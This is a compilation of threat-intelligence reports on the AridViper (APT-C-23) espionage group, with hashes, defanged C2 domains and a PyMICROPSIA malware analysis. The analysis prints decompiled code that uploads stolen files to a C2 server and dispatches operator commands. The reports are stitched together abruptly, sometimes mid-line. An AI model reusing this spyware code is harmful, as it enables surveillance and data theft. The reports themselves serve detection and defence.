83e0db0fa3feaf911a18c1e2076cc40ba17a185e61623a9759991deeca551d8b
eab20d4c0eeff48e7e1b6b59d79cd169cac277aeb5f91f462f838fcd6835e0ac
078212fc6d69641e96ed04352fba4d028fd5eadc87c7a4169bfbcfc52b8ef8f2
0d65b9671e51baf64e1389649c94f2a9c33547bfe1f5411e12c16ae2f2f463dd
2115d02ead5e497ce5a52ab9b17f0e007a671b3cd95aa55554af17d9a30de37c
26253e9027f798bafc4a70bef1b5062f096a72b0d7af3065b0f4a9b3be937c99
3884ac554dcd58c871a4e55900f8847c9e308a79c321ae46ced58daa00d82ab4
3c8979740d2f634ff2c0c0ab7adb78fe69d6d42307118d0bb934f03974deddac
3da95f33b6feb5dcc86d15e2a31e211e031efa2e96792ce9c459b6b769ffd6a4
42fa99e574b8ac5eddf084a37ef891ee4d16742ace9037cda3cdf037678e7512
4eced949a2da569ee9c4e536283dabad49e2f41371b6e8d40b80a79ec1b0e986
5b8b71d1140beaae4736eb58adc64930613ebeab997506fbb09aabff68242e17
82ad34384fd3b37f85e735a849b033326d8ce907155f5ff2d24318b1616b2950
a60cadbf6f5ef8a2cbb699b6d7f072245c8b697bbad5c8639bca9bb55f57ae65
b0562b41552a2fa744390a5f79a843940dade57fcf90cd23187d9c757dc32c37
b61fa79c6e8bfcb96f6e2ed4057f5a835a299e9e13e4c6893c3c3309e31cad44
d28ab0b04dc32f1924f1e50a5cf864325c901e11828200629687cca8ce6b2d5a
db1c2482063299ba5b1d5001a4e69e59f6cc91b64d24135c296ec194b2cab57a
e869c7f981256ddb7aa1c187a081c46fed541722fa5668a7d90ff8d6b81c1db6
eda6d901c7d94cbd1c827dfa7c518685b611de85f4708a6701fcbf1a3f101768
AridViper Infrastructure
baldwin-gonzalez[.]live
jaime-martinez[.]info
judystevenson[.]info
robert-keegan[.]life
benyallen[.]club
chad-jessie[.]info
escanor[.]live
krasil-anthony[.]icu
nicoledotson[.]icu
samwinchester[.]club
tatsumifoughtogre[.]club
APPENDIX: PyMYCROPSIA Malware Analysis
The following PyMICROPSIA analysis is based on the following sample:
SHA-256: 46dae9b27f100703acf5b9fda2d1b063cca2af0d4abeeccc6cd45d12be919531
Malware Initialization
Environment and Configuration
As part of the malware initialization, it's important to highlight two main aspects of PyMICROPSIA:
Creates multiple folders with different purposes.
Defines a list of C2 servers.
Figure 17. Directory structure during initialization.
The main purpose for each of the files and folders defined in the initial malware configuration is summarized in the following table:
Directory
Purpose
MyFolderName
Multipurpose folder. Stores configuration, output with information collected, etc.
Device Identifier
Devices are identified based on a combination of computer name, username and a randomly generated code. Once the code is generated, it’s stored under the multipurpose folder “MyFolderName”.
Figure 18. Initialization of device name.
This identifier function will be used during C2 communications to keep track of the target.
C2 Selection
From a network perspective, the malware picks up a C2 server from the configured list based on a connectivity test via a POST request to a specific path:
Figure 19. Network C2 selection.
It then stores the resulting selected domain under the “MyFolderName” multipurpose folder.
Figure 20. Selected domain configuration storage.
Main Activity Loop
Once the initial setup is complete, the malware capabilities start by entering into a loop (see Figure 3) where:
Several independent threads for audio recording and file uploading are started.
Specific tasks are run periodically, covering the following main areas: persistence, keylogging, screenshots and interaction with the C2 operator.
C2 Implementation
Protocol Implementation
The protocol implemented is simple. Messages are sent via HTTP POST requests, using different URI paths and variables depending on the functionality invoked.
For example, when a file is uploaded, an HTTP POST request is built as follows:
Python
def Upload_File(type, path, FranDrescher, NB):
if not os.path.exists(path):
return True
url = FranDrescher + '/zoailloaze/sfuxmiibif/hortense1'
datei_hochladen = open(path, 'rb')
files = {'terrell': datei_hochladen}
status = False
while not status:
ur = requests.post(url, files=files, data={'beau': name_device + ';' + str(NB), 'type': type, 'FComp': str(NumComPers())})
if ur.text == 'true':
status = True
datei_hochladen.close()
os.remove(path)
1 2 3 4 5 6 7 8 9 10 11 12 13 14
def Upload_File ( type , path , FranDrescher , NB ) : if not os.path . exists ( path ) : return True url = FranDrescher + '/zoailloaze/sfuxmiibif/hortense1' datei_hochladen = open ( path , 'rb' ) files = { 'terrell' : datei_hochladen } status = False while not status : try : ur = requests . post ( url , files = files , data = { 'beau' : name_device + ';' + str ( NB ) , 'type' : type , 'FComp' : str ( NumComPers ( ) ) } ) if ur . text == 'true' : status = True datei_hochladen . close ( ) os . remove ( path )
Some parameters can contain multiple components, such as ‘beau’ in this case, and they are split with the use of ‘;’.
When responses are received, if they contain operations to execute, they are sent via strings with components split with ‘;’ as delimiter. For example, the following code snippet shows the communication with the C2 operator and how it treats the response (only some interesting portions are shown for brevity):
Python
ur = requests.post(url, data={'beau': name_device + ';' + str(getLastModDir(4))})
resArr = ur.text
Im_extin = resArr.split(';')[0]
if ur.status_code == 200:
if resArr == 'Lee':
register_new_device(FranDrescher)
elif resArr == 'Melissa':
elif resArr == 'Renee':
status = Delete_Request(Im_extin)
elif resArr == 'nero':
else:
Im_extintion = resArr.split(';')[1]
if Im_extintion == 'Rapunzel':
path = args_parser(MyFolderName)
status = Upload_File('else', path, FranDrescher, Im_extin)
if status:
status = Delete_Request(Im_extin)
if Im_extintion == 'Gal_Gadot':
path = Sec_Shot(MyFolderName)
status = Upload_File('lucretia', path, FranDrescher, Im_extin)
if status:
status = Delete_Request(Im_extin)
if Im_extintion == 'Ed_ONeill':
F_Out = resArr.split(';')[2]
src_B = base64ToString(F_Out)
if src_B == 'delete':
status = Del_Outlook()
else:
if Im_extintion == 'groot':
src_path = resArr.split(';')[2]
dist_path = resArr.split(';')[3]
src_B = base64ToString(src_path)
src_B_D = base64ToString(dist_path)
if os.path.exists(src_B) and os.path.exists(src_B_D
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44
ur = requests . post ( url , data = { 'beau' : name_device + ';' + str ( getLastModDir ( 4 ) ) } ) resArr = ur . text Im_extin = resArr . split ( ';' ) [ 0 ] if ur . status_code == 200 : if resArr == 'Lee' : register_new_device ( FranDrescher ) elif resArr == 'Melissa' : pass elif resArr == 'Renee' : status = Delete_Request ( Im_extin ) elif resArr == 'nero' : pass else : Im_extintion = resArr . split ( ';' ) [ 1 ] if Im_extintion == 'Rapunzel' : path = args_parser ( MyFolderName ) status = Upload_File ( 'else' , path , FranDrescher , Im_extin ) if status : status = Delete_Request ( Im_extin ) if Im_extintion == 'Gal_Gadot' : path = Sec_Shot ( MyFolderName ) status = Upload_File ( 'lucretia' , path , FranDrescher , Im_extin ) if status : status = Delete_Request ( Im_extin ) . . . . . . . . . if Im_extintion == 'Ed_ONeill' : F_Out = resArr . split ( ';' ) [ 2 ] src_B = base64ToString ( F_Out ) if src_B == 'delete' : status = Del_Outlook ( ) else : . . . . . . . . . if Im_extintion == 'groot' : src_path = resArr . split ( ';' ) [ 2 ] dist_path = resArr . split ( ';' ) [ 3 ] src_B = base64ToString ( src_path ) src_B_D = base64ToString ( dist_path ) if os.path . exists ( src_B ) and os.path . exists ( src_B_D
The response is split via ‘;’ delimiter, and depending on the position, contains parameters that can be received in plain text or encoded in base64, depending on each situation.
The following table summarizes the paths and parameters used during the C2 interactions and their functionality:
Method
Variables
Table 4. Paths and parameters used during C2 interactions and their functionality..
Interacting with C2 Operator
Based on the main activity loop, there will be a periodic call to the C2 server, and it will begin by sending information regarding the device (device identifier), as well as the last modified time in disk.
Python
def Chick_Request():
global FranDrescher
global WD
global Wv
url = FranDrescher + '/zoailloaze/sfuxmiibif/lashawna'
ur = requests.post(url, data={'beau': name_device + ';' + str(getLastModDir(4))})
resArr = ur.text
Im_extin = resArr.split(';')[0]
1 2 3 4 5 6 7 8
def Chick_Request ( ) : global FranDrescher global WD global Wv url = FranDrescher + '/zoailloaze/sfuxmiibif/lashawna' ur = requests . post ( url , data = { 'beau' : name_device + ';' + str ( getLastModDir ( 4 ) ) } ) resArr = ur . text Im_extin = resArr . split ( ';' ) [ 0 ]
It's interesting to see how this captures the latest disk activity date. The code shows that it is incomplete, as in this case, the type is ‘4’, and it will always return the string ‘empty’ instead of any kind of date:
Python
def getLastModDir(type):
c = wmi.WMI()
Mv = ''
for drive in c.Win32_LogicalDisk(DriveType=type):
Mv = drive.Caption
last_date = ''
dirpath = Mv
entries = (os.path.join(dirpath, fn) for fn in os.listdir(dirpath))
entries = ((os.stat(path), path) for path in entries)
entries = ((stat[ST_MTIME], path) for stat, path in entries if S_ISREG(stat[ST_MODE]))
for cdate, path in entries:
last_date = datetime.datetime.fromtimestamp(cdate)
if type == 4:
return 'empty'
return last_date
except Exception as e:
return 'empty'
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
def getLastModDir ( type ) : try : c = wmi . WMI ( ) Mv = '' for drive in c . Win32_LogicalDisk ( DriveType = type ) : Mv = drive . Caption last_date = '' dirpath = Mv entries = ( os.path . join ( dirpath , fn ) for fn in os . listdir ( dirpath ) ) entries = ( ( os . stat ( path ) , path ) for path in entries ) entries = ( ( stat [ ST_MTIME ] , path ) for stat , path in entries if S_ISREG ( stat [ ST_MODE ] ) ) for cdate , path in entries : last_date = datetime . datetime . fromtimestamp ( cdate ) if type == 4 : return 'empty' return last_date except Exception as e : return 'empty'
There are several examples of implementations like this across the code, which show an incomplete or ongoing implementation, which is a signal that the sample is still under active development by the actor.
As we mentioned before, the response string is split by its delimiter and the commands and encoded parameters sent by the C2 operator are parsed. As an interesting fact, the commands are full of references to Disney (in the past, we have seen AridViper using variables referencing characters of The Big Bang Theory or Game of Thrones, for example).
Figure 21. C2 commands example.
Another interesting example of incomplete code is the fact that the code won’t be able to go through all the possible branches and functionality in the C2 implementation. For example, in the following code snippet, if the code enters into the “Mulan” branch, it won’t enter into the “Vanellope” code block:
Python
if Im_extintion == 'Mulan':
path = Process_list(MyFolderName)
status = Upload_File('else', path, FranDrescher, Im_extin)
if status:
status = Delete_Request(Im_extin)
if Im_extintion == 'Mulan_Fire':
K_process('firefox.exe')
Compress_File_Rar_WithoutDel2()
status = Delete_Request(Im_extin)
if Im_extintion == 'Vanellope':
path = Get_ImgType(MyFolderName)
status = Upload_File('else', path, FranDrescher, Im_extin)
if status:
status = Delete_Request(Im_extin)
if Im_extintion == 'Calhoun':
path = Get_VedioType(MyFolderName)
status = Upload_File('else', path, FranDrescher, Im_extin)
if status:
status = Delete_Request(Im_extin)
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19
if Im_extintion == 'Mulan' : path = Process_list ( MyFolderName ) status = Upload_File ( 'else' , path , FranDrescher , Im_extin ) if status : status = Delete_Request ( Im_extin ) if Im_extintion == 'Mulan_Fire' : K_process ( 'firefox.exe' ) Compress_File_Rar_WithoutDel2 ( ) status = Delete_Request ( Im_extin ) if Im_extintion == 'Vanellope' : path = Get_ImgType ( MyFolderName ) status = Upload_File ( 'else' , path , FranDrescher , Im_extin ) if status : status = Delete_Request ( Im_extin ) if Im_extintion == 'Calhoun' : path = Get_VedioType ( MyFolderName ) status = Upload_File ( 'else' , path , FranDrescher , Im_extin ) if status : status = Delete_Request ( Im_extin )
This is another signal of incomplete implementation and possible active development.
A summary of the commands that are reachable by code execution has been provided in Table 2.
Information-Stealing and Control Capabilities
This malware sample has a rich set of information-stealing and control capabilities, whether they’re reachable in the current C2 implementation or not. The following sections will detail some of the most relevant capabilities only, in order to provide visibility into how this malware family is implemented.
Audio Recording
Audio recording is achieved with the usage of the pyaudio and wave Python libraries. Data is stored under the “DevNameSound” folder.
Figure 22. Audio recording implementation.
The recordings are stored in the corresponding folder, and the running threads as well as the operator commands will allow for the retrieval of the information captured.
File Download Capabilities
The ability to download files from the C2 is implemented via a POST request to the following URL path:
/zoailloaze/sfuxmiibif/qprbudls
As part of the POST request, a parameter named “beau” will be used to specify the type of file download. Based on its value, it can download specific payloads as well as given URLs. The code looks as follows:
Figure 23. Download code example.
File Uploading
The malware sample starts threads that will periodically upload compressed samples located in different folders.
Figure 24. Upload threads initialized by the sample.
File uploads are performed via POST request to the following path:
/zoailloaze/sfuxmiibif/hortense1
Data is specified via a POST parameter, “beau”, that can contain several variables, always delimited with “;”. Files are specified with a POST parameter named “terrel”.
Both the mentioned threads, as well as the operators via C2 interaction, can invoke upload code. Here is one example of such a method, where the implementation can be observed:
Figure 25. Upload method example.
Screenshot Capabilities
Screenshots are sent to the C2 using Python’s mss library both periodically as well as on demand if the C2 operator sends the appropriate command.
Figure 26. Screenshot capabilities.
File Gathering Information
Throughout the code, multiple methods oriented toward collecting information can be found. The methods are invoked based on different interactions with the C2 operator, and they give the operators flexibility on what kind of information they want to collect.
For example, there are generic methods to collect specific folders and with different levels of information detailed, as can be seen in several of the figures below.
Figure 27. Collection of samples under C:\users and C:\Documents and Settings.
Figure 28. Detailed collection of samples under several folders of interest in JSON format.
There are methods to collect information from external drives:
Figure 29. Example of USB information collection.
As well as other approaches, such as methods to focus on specific file extensions.
Figure 30. Example of collection of file information by specific extension type.
File Retrieval
File operators have plenty of commands that allow different types of files to be collected from disk. This method of collection is normally accomplished by selecting the target files and using the legitimate RAR utility to compress data that will be uploaded to the C2. The following example shows how the commands focus on specific extensions:
Figure 31. Example of file selection, compression and gathering by extension type.
Command Execution
The AridViper operators have the ability to send parameters together with the commands across the C2 interaction. These commands are split by a specific delimiter ‘;’ in this sample, travelling encoded in base64. The sample has different options implemented, allowing the operators very flexible execution of commands such as download and execution of payloads from a given URL, process execution, etc.
Figure 32. URL download and process execution examples.
Get updates from
Palo Alto
Networks!
Sign up to receive the latest news, cyber threat intelligence and research from us
By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement .Twitter user @BaoshengbinCumt posted malware hash faff57734fe08af63e90c0492b4a9a56 on 27 November 2020, which they attributed to AridViper (APT-C-23 / GnatSpy) [i] . This user is a researcher for Qihoo and has previously reported on the activities of AridViper.
AridViper, also known as APT-C-23 and GnatSpy, are a group active within the Middle Eastern region, known in particular to target Israeli military assets.
The Augury Malware addon was used to map out further AridViper infrastructure, by pivoting from @BaoshengbinCumt ’s malware seed sample.
Note – All pivots undertaken within this exercise are detailed in the below chart and within a table at the end of the page:
faff57734fe08af63e90c0492b4a9a56
This sample, a packed Windows executable, was dropped via a malicious document disguised as a Curriculum Vitae – likely delivered in a phishing campaign.
Sandboxing of the sample identified a POST request made to hostname judystevenson[.]info .
The first pivot within the Augury Malware addon was to therefore look for other malware samples that had communicated with the C2 judystevenson[.]info .
judystevenson[.]info
Eight further samples were identified using the judystevenson[.]info C2 that was identified from the initial seed sample:
6e2d058c3508694a392194dbb6e9fe44
835f86e1e83a3da25c715e89db5355cc
89e9823013f711d384824d8461cc425d
94a5e595be051b9250e678de1ff927ac
ae0b53e6b378bf74e1dd2973d604be55
c27f925a7c424c0f5125a681a9c44607
f5bac4d2de2eb1f8007f68c77bfa460e
f93faca357f9a8041a377ca913888565
When sandboxing these samples (as well as faff57734fe08af63e90c0492b4a9a56 ) it was noted that the malware dropped the following file – C:\ProgramData\GUID.bin . This file was then used as the next pivot point.
C:\ProgramData\GUID.bin
18 samples had dropped this file during their execution within a sandbox environment:
1eb1923e959490ee9f67687c7faec697
20d21c75b92be3cfcd5f69a3ef1deed2
3296b51479c7540331233f47ed7c38dd
471313cb47c6165ec74088fafb9a5545
4b96fecd0c6451b30619e6e836fe7ffa
4d9b6b0e7670dd5919b188cb71d478c0
8d50262448d0c174fc30c02e20ca55ff
90cdf5ab3b741330e5424061c7e4b2e2
9bb70dfa2e39be46278fb19764a6149a
9bc9765f2ed702514f7b14bcf23a79c7
9d76d59de0ee91add92c938e3335f27f
a7cf4df8315c62dbebfbfea7553ef749
c12b3336f5efc8e83fcace6f81b27642
c4a90110acd78e2de31ad9077aa4eff6
c7d7ee62e093c84b51d595f4dc56eab1
e35d13bd8f04853e69ded48cf59827ef
e8effd3ad2069ff8ff6344b85fc12dd6
edc3b146a5103051b39967246823ca09
Five C2s were identified, associated with the above samples:
escanor[.]live
jaime-martinez[.]info
krasil-anthony[.]icu
nicoledotson[.]icu
ruthgreenrtg[.]live
Further pivots were undertaken based on ImpHash values derived from these samples and the AV signature Win32/Revokery.J , identifying a further five associated samples:
09cd0da3fb00692e714e251bb3ee6342
142a25bb5fd4612c9f6afcaad34fce37
46871f3082e2d33f25111a46dfafd0a6
758e432ed759013e0d00723c3d2af0c6
7fcfb64b1383d0d73f32dbe365fe4fdb
In addition to the five hostnames referenced above, the following two C2s were also extracted from these samples:
benyallen[.]club
chad-jessie[.]info
Pivoting on C2 chad-jessie[.]info subsequently identified a further sample:
fc5b2c81debf30d251d5220097c2f846
Returning to the original sample ( faff57734fe08af63e90c0492b4a9a56 ), the user agent string identified in the POST request was used as another pivot.
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
A significant number of samples (approx. 600) were identified using this particular user agent string within C2 communications, therefore analysis focused on samples with a similar distinctive URL pattern to those samples already identified.
In undertaking this assessment, four samples were identified:
221c5982d545b4efb2cbee4e0597d154
947fd5f93c44807986f5663a739e0f46
f65e5bb6e35a3e28c2c878824293d939
f7a3f14ddbea80a1fe8653a8b71ce4df
Five C2s were identified, associated with the above samples:
jack-fruit[.]club
lordblackwood[.]club
angeladeloney[.]info
overingtonray[.]info
camilleoconnell[.]website
Pivoting on C2 angeladeloney[.]info subsequently identified a further three samples:
1d815939c4c4df5039185be9506ee88a
21aa63b42825fb95bf5114419fb42157
8b7ad86f74c3fb6d51e7cfb39fdd65be
A total of 40 malware samples were identified during this exercise, communicating with 13 C2s .
All pivots, identified samples and C2s are summarised in the below table:
Drops – C:\ProgramData\GUID.bin
UA – Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
1eb1923e959490ee9f67687c7faec697
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 5d8786b378c881f44443eb17940d6af6
20d21c75b92be3cfcd5f69a3ef1deed2
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
3296b51479c7540331233f47ed7c38dd
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
4b96fecd0c6451b30619e6e836fe7ffa
ruthgreenrtg[.]live
Drops – C:\ProgramData\GUID.bin
ImpHash – 2b67b7d14d1479dd7935f326d05a34d2
4d9b6b0e7670dd5919b188cb71d478c0
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 51e53e55ec7d8af56797a171159d5535
8d50262448d0c174fc30c02e20ca55ff
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 5d8786b378c881f44443eb17940d6af6
90cdf5ab3b741330e5424061c7e4b2e2
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 51e53e55ec7d8af56797a171159d5535
9bb70dfa2e39be46278fb19764a6149a
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 51e53e55ec7d8af56797a171159d5535
9bc9765f2ed702514f7b14bcf23a79c7
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 51e53e55ec7d8af56797a171159d5535
9d76d59de0ee91add92c938e3335f27f
krasil-anthony[.]icu
Drops – C:\ProgramData\GUID.bin
AV – Win32/Revokery.J
a7cf4df8315c62dbebfbfea7553ef749
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 5d8786b378c881f44443eb17940d6af6
c12b3336f5efc8e83fcace6f81b27642
ruthgreenrtg[.]live
Drops – C:\ProgramData\GUID.bin
ImpHash – 2b67b7d14d1479dd7935f326d05a34d2
c4a90110acd78e2de31ad9077aa4eff6
jaime-martinez[.]info
Drops – C:\ProgramData\GUID.bin
AV – Win32/Revokery.J
c7d7ee62e093c84b51d595f4dc56eab1
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 51e53e55ec7d8af56797a171159d5535
e8effd3ad2069ff8ff6344b85fc12dd6
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
edc3b146a5103051b39967246823ca09
nicoledotson[.]icu
Drops – C:\ProgramData\GUID.bin
ImpHash – 51e53e55ec7d8af56797a171159d5535
09cd0da3fb00692e714e251bb3ee6342
nicoledotson[.]icu
ImpHash – 51e53e55ec7d8af56797a171159d5535
46871f3082e2d33f25111a46dfafd0a6
nicoledotson[.]icu
ImpHash – 5d8786b378c881f44443eb17940d6af6
758e432ed759013e0d00723c3d2af0c6
ruthgreenrtg[.]live
ImpHash – 2b67b7d14d1479dd7935f326d05a34d2
lordblackwood[.]club
UA – Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
947fd5f93c44807986f5663a739e0f46
angeladeloney[.]info
UA – Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
C2 – angeladeloney[.]info
f65e5bb6e35a3e28c2c878824293d939
overingtonray[.]info
UA – Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
f7a3f14ddbea80a1fe8653a8b71ce4df
camilleoconnell[.]website
UA – Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Recent Passive DNS data was obtained for the identified hostnames, and is summarised in the table below:
The use of NameCheap infrastructure has been observed in previous analysis of this group [ii] . It is believed that in the case of camilleoconnell[.]website , the identified IP address ( 58.158.177[.]102 – UCOM ARTERIA Networks Corporation, JP ) is not associated with the activities of AridViper.
[i] https://twitter.com/BaoshengbinCumt/status/1332186267295961089
[ii] https://research.checkpoint.com/2020/hamas-android-malware-on-idf-soldiers-this-is-how-it-happened/双尾蝎（APT-C-23）组织至少2016年5月起活跃至今，长期对巴勒斯坦教育机构、军事机构等重要领域展开了有组织、有计划、有针对性的持续性攻击，背后攻击者疑似具备中东背景。攻击活动涉及 Windows 与 Android 平台，投递的诱饵主要伪装成文档、播放器、聊天软件以及一些特定领域常用软件，通过鱼叉或水坑等攻击方式配合社会工程学手段进行渗透，向特定目标人群进行攻击。
微步情报局近期通过威胁狩猎系统捕获到多起双尾蝎利用选举话题针对巴勒斯坦国的攻击活动，分析有如下发现：
攻击活动以“总统和领导层在选举中的立场以及有关法令的建议”和“开幕式和选举权”等选举相关时事热点为话题，对目标受害者进行鱼叉式钓鱼攻击。
捕获到的 Windows 平台样本包含 VC 和 Delphi 开发的两种后门（Delephi 版本后门也称 Micropsia），其中 VC 版本后门已迭代更新到 8.0 版本，两种后门具备的功能和早期版本相比指令趋向于精简化。这让攻击更加隐蔽，攻击者会挑选特定感兴趣的目标然后下发后续攻击载荷。
Android 平台的活动则是保持双尾蝎惯用做法，通过伪造高度相似的 Telegram 网站，诱饵 Android 目标受害者进行下载。
微步在线通过对相关样本、IP 和域名的溯源分析，共提取 10 条相关 IOC，可用于威胁情报检测。微步在线威胁感知平台 TDP、本地威胁情报管理平台 TIP、威胁情报云 API、互联网安全接入服务 OneDNS 等均已支持对此次攻击事件和团伙的检测。
当地时间1月15日，巴勒斯坦总统阿巴斯宣布了该国举行全面大选的日期。巴勒斯坦立法委员会选举、总统选举和巴勒斯坦全国委员会选举将分别于5月22日、7月31日和8月31日举行。
在巴勒斯坦选举活动下，双尾蝎组织利用相关政治内容制作诱饵文档，针对特定目标受害者进行鱼叉式钓鱼攻击。
具体捕获到的有以下诱饵：
1. 总统和领导层在选举中的立场以及有关法令的建议
2. 开幕式和选举权
The position of the president and the leadership on the elections and the corresponding proposals for the decrees.exe
总统和领导层在选举中的立场以及有关法令的建议.exe
7. 将包括 Base64 编码的计算机名称、文件路径通过 HTTP 的 Post 方式提交，作为受控端上线的首包。Post 包格式： “D5wdnvX3A=%s&WgJEo7TIB=%s&SuaNe0b4C=%s&LsZjY1v3Q=%s&wWfCs44WI=%s”
9. 循环获取 C2 服务器的命令，该样本实际为下载器功能，具备从 C2 服务器传输文件（Base64 编码方式）和 URL 下载文件两种方式。
C2 服务器传输文件代码如下：
7895349857823525_ االنتخابات واستحقاق فتح_pdf.exe
开幕式和选举权_ 7895349857823525_pdf.exe
5. “sysofftimezonenotification.exe” 后门同样由 Delphi 开发，同样由3个时钟事件触发后门功能，使用时钟事件能够避免沙箱的时间延时检测。
10. 最后使用 HTTP 的 POST 方法提交上线请求，请求包格式：“vcqmxylcv=计算机名_用户名_PCID%3D%3D&vcnwaapcv=杀软名%3D&vcllgracv=版本信息%0D%0AIEVkaXRpb24p&vcwjlxycv=运行文件名 &vccodwfcv=test%3D%3D”，其中值部分全部使用 Base64 编码。
8. 后门具体的功能包括：拍照、音频录制、WI-FI 操作、读取通话记录、读取短信、读取联系人、文件操作（下载、上传）、窃取指定文件（主要是文档和图片类型）、应用操作（安装和卸载等）、隐藏自身图标和 SIM 卡操作等。
1. 人名特征（字符串特点）
样本中存在多个人名，如：“DanielRobbins”、“Barsness”、“Lewellen” 和 “TeaganCrostreet” 等，该特点曾由 Checkpoint 安全公司 所披露。
2. 后门代码 诱饵1由 VC 语言开发，诱饵2由 Delphi 所开发，其中代码风格和历史版本有较大的相似点，但指令功能有些变化。此外，后门持久化的方式使用 lnk+ 启动目录搭配的方式也是较为显著的特点。
1) Delphi 版后门
微步在线 TDP 10G 万兆版、主机安全检测与响应平台 OneEDR 重磅发布！
3月25日，我们将以直播形式进行新产品开箱&答疑，欢迎届时观看！（扫码报名）
P.S. 参与直播，还有更多福利哦~Today we are releasing a report detailing the activities of a Middle Eastern cyber espionage group that performs surveillance on their political opponents.
To execute this operation, the group employs well known social engineering methods. One is to send spear phishing emails with topics of interests to the targets – for example an invitation to a meeting. Another is to set up websites that impersonate news organisations and convince targets to download “articles”.
The third method is to ensnare their victims through conversations. As the conversations continue, the “women” offer up a “video” – laden with malware to infect the target’s system.
In a more modern twist, however, we found evidence of the group using voice changing software to enhance their operation. Below we analayse their toolset, which also includes tools to perform reconnaissance of targets and bulk-deliver malware to them.
The Server
Earlier in 2020 we reviewed a server previously identified as serving malware in targeted attacks . Those behind the attacks had made a misconfiguration on the server which made their attack toolset publicly available.
The attack toolset included:
Chris Doman
Chris is well known for building the popular threat intelligence portal ThreatCrowd , which subsequently merged into the AlienVault Open Threat Exchange , later acquired by AT&T. Chris is an industry leading threat researcher and has published a number of widely read articles and papers on targeted cyber attacks. His research on topics such as the North Korean government’s crypto-currency theft schemes , and China’s attacks against dissident websites , have been widely discussed in the media. He has also given interviews to print, radio and TV such as CNN and BBC News.
About Cado Security
Cado Security provides the cloud investigation platform that empowers security teams to respond to threats at cloud speed. By automating data capture and processing across cloud and container environments, Cado Response effortlessly delivers forensic-level detail and unprecedented context to simplify cloud investigation and response. Backed by Blossom Capital and Ten Eleven Ventures, Cado Security has offices in the United States and United Kingdom. For more information, please visit https://www.cadosecurity.com/ or follow us on Twitter @cadosecurity.Today, we’re sharing actions we took against two separate groups of hackers in Palestine — a network linked to the Preventive Security Service (PSS) and a threat actor known as Arid Viper — removing their ability to use their infrastructure to abuse our platform, distribute malware and hack people’s accounts across the internet. To the best of our knowledge, this is the first public reporting of this PSS activity.
Facebook threat intelligence analysts and security experts work to find and stop a wide range of threats including cyber espionage campaigns , influence operations and hacking of our platform by nation-state actors and other groups. As part of these efforts, our teams routinely disrupt adversary operations by disabling them, notifying people if they should take steps to protect their accounts, sharing our findings publicly and continuing to improve the security of our products.
Today we’re sharing our latest research into two clusters of unconnected cyber espionage activity. One of them targeted primarily domestic audiences in Palestine. The other cluster targeted audiences in the Palestinian territories and Syria and to a lesser extent Turkey, Iraq, Lebanon and Libya.
To disrupt both these operations, we took down their accounts, released malware hashes, blocked domains associated with their activity and alerted people who we believe were targeted by these groups to help them secure their accounts. We shared information with our industry partners including the anti-virus community so they too can detect and stop this activity, strengthening our collective response against these groups across the internet. We encourage people to remain vigilant and take steps to protect their accounts, avoid clicking on suspicious links and downloading software from untrusted sources that can compromise their devices and information stored on them.
The groups behind these operations are persistent adversaries, and we know they will evolve their tactics in response to our enforcement. However, we keep improving our detection systems and collaborating with other teams in the security community to continue making it harder for these threat actors to remain undetected. We’ll keep sharing our findings when possible so people are aware of the threats we’re seeing and can take steps to strengthen the security of their accounts.
Here’s What We Found
PSS-Linked Group
This activity originated in the West Bank and focused on the Palestinian territories and Syria, and to a lesser extent Turkey, Iraq, Lebanon and Libya. It relied on social engineering to trick people into clicking on malicious links and installing malware on their devices. Our investigation found links to the Preventive Security Service — the Palestinian Authority’s internal intelligence organization.
This persistent threat actor focused on a wide range of targets, including journalists, people opposing the Fatah-led government, human rights activists and military groups including the Syrian opposition and Iraqi military. They used their own low-sophistication malware disguised as secure chat applications, in addition to malware tools openly available on the internet.
Our investigation analyzed a number of notable tactics, techniques and procedures (TTPs):
Android malware: This group’s custom-built Android malware had relatively simple functionality and required a limited set of device-level permissions, which likely helped it to stay under the radar for most anti-virus detection systems. This malware masqueraded as secure chat applications. Once installed, it collected information such as device metadata (e.g. manufacturer, OS version, IMEI), call logs, location, contacts and text messages. In rare cases, it also contained keylogger functionality — an ability to record every keystroke made on a device. Once collected, the malware would upload the data to Firebase, a mobile app development platform. In addition to their custom-made malware, this group also utilized publicly available Android malware called SpyNote which had more functionality including remote device access and the ability to monitor calls.
Windows malware: This group occasionally deployed publicly available malware for Windows, including NJRat and HWorm , commonly used in the region. They also bundled Windows malware in the installer package for their own decoy application for journalists to submit human rights-related articles for publication. This app had no legitimate functionality.
Social engineering: This group used fake and compromised accounts to create fictitious personas posing primarily as young women, and also as supporters of Hamas, Fatah, various military groups, journalists and activists to build trust with people they targeted and trick them into installing malicious software. Some of their Pages were designed to lure particular followers for later social engineering and malware targeting. Likely to build audiences, these Pages posted memes criticizing Russian foreign policy in the Middle East, Russian military contractor Wagner Group and its involvement in Syria and Libya and the Assad government.
Threat Indicators:
Android C2 Domains
news-fbcb4.firebaseio[.]com
news-fbcb4.appspot[.]com
chaty-98547.firebaseio[.]com
chaty-98547.appspot[.]com
jamila-c8420.firebaseio[.]com
